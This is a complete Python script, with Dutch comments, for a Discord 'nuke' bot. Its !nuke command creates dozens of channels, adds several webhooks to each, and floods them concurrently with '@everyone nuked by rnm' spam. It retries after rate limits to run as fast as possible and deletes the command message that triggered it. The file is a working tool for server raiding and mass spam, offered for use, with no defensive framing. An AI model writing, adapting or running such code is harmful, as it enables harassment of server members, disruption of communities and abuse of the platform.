import discord
from discord.ext import commands
import asyncio
import random
import time
import os

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ================== SNELLE SETTINGS ==================
SPAM_MESSAGE = "@everyone nuked by rnm"
CHANNEL_PREFIX = "nuked-"
NUM_CHANNELS = 25
WEBHOOKS_PER_CHANNEL = 5
MESSAGES_PER_WEBHOOK = 40
CREATE_CONCURRENCY = 15
WEBHOOK_CONCURRENCY = 20
SPAM_CONCURRENCY = 50
MAX_RETRIES = 5
# =====================================================

# Stop flag
stop_nuke = False

@bot.event
async def on_ready():
    print(f"[+] Logged in as {bot.user} | FAST MODE")

async def safe_request(coro, retries=MAX_RETRIES):
    for attempt in range(retries):
        if stop_nuke:
            return None
        try:
            return await coro
        except discord.HTTPException as e:
            if e.status == 429:
                retry = getattr(e, "retry_after", None) or (0.2 * (attempt + 1))
                await asyncio.sleep(retry)
            else:
                break
        except Exception:
            break
    return None

@bot.command()
@commands.has_permissions(administrator=True)
async def stop(ctx):
    """Stop de nuke onmiddellijk"""
    global stop_nuke
    stop_nuke = True
    await ctx.send("🛑 Nuke gestopt.")
    print("[!] STOP COMMAND ONTVANGEN")

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    global stop_nuke
    stop_nuke = False

    guild = ctx.guild
    try:
        await ctx.message.delete()
    except:
        pass

    print(f"\n[*] FAST NUKE STARTED on {guild.name}")
    start = time.time()

    created_channels = []
    all_webhooks = []

    # 1. Channels maken
    print("[*] Channels maken...")
    sem_create = asyncio.Semaphore(CREATE_CONCURRENCY)

    async def create_channel(i):
        if stop_nuke:
            return
        async with sem_create:
            name = f"{CHANNEL_PREFIX}{i}-{random.randint(100,999)}"
            channel = await safe_request(guild.create_text_channel(name))
            if channel:
                created_channels.append(channel)
                print(f"[+] {name}")

    await asyncio.gather(*[create_channel(i) for i in range(NUM_CHANNELS)])
    if stop_nuke:
        return print("[!] Gestopt tijdens channel creatie")

    # 2. Webhooks maken
    print("[*] Webhooks maken...")
    sem_wh = asyncio.Semaphore(WEBHOOK_CONCURRENCY)

    async def create_webhooks(channel):
        if stop_nuke:
            return
        async with sem_wh:
            for _ in range(WEBHOOKS_PER_CHANNEL):
                if stop_nuke:
                    return
                wh = await safe_request(channel.create_webhook(name=f"nuked-{random.randint(1000,9999)}"))
                if wh:
                    all_webhooks.append(wh)

    await asyncio.gather(*[create_webhooks(ch) for ch in created_channels])
    if stop_nuke:
        return print("[!] Gestopt tijdens webhook creatie")

    print(f"[*] {len(all_webhooks)} webhooks klaar")

    # 3. Spammen
    print("[*] Spammen...")
    sem_spam = asyncio.Semaphore(SPAM_CONCURRENCY)

    async def spam_webhook(wh):
        if stop_nuke:
            return
        async with sem_spam:
            for _ in range(MESSAGES_PER_WEBHOOK):
                if stop_nuke:
                    return
                await safe_request(wh.send(SPAM_MESSAGE))

    await asyncio.gather(*[spam_webhook(wh) for wh in all_webhooks])

    total = time.time() - start
    print(f"\n[+] KLAAR in {total:.1f}s | Messages: ~{len(all_webhooks)*MESSAGES_PER_WEBHOOK}")

bot.run(os.getenv("DISCORD_TOKEN"))
